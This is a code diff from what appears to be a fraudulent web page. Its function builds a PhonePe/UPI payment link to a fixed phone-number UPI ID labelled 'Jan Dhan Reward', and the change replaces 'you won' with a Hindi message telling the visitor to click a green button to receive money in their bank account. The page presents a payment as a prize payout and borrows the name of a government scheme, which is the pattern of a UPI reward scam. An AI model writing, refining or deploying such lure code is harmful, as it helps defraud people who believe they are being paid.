@@ -274,7 +274,7 @@
         function redirectToPhonePe() {
             const amount = getRewardAmount();
             const upi = '8271514079-1@nyes';
-            const description = 'you won';
+            const description = 'बधाई हो! हरे बटन पर क्लिक करें और पैसा सीधे बैंक खाते में लें। 👇';
             
             const phonepeUrl = `upi://pay?pa=${upi}&pn=Jan%20Dhan%20Reward&am=${amount}&cu=INR&tn=${encodeURIComponent(description)}`;
             const webUrl = `https://phon.pe/${upi}?amount=${amount}&description=${encodeURIComponent(description)}`;
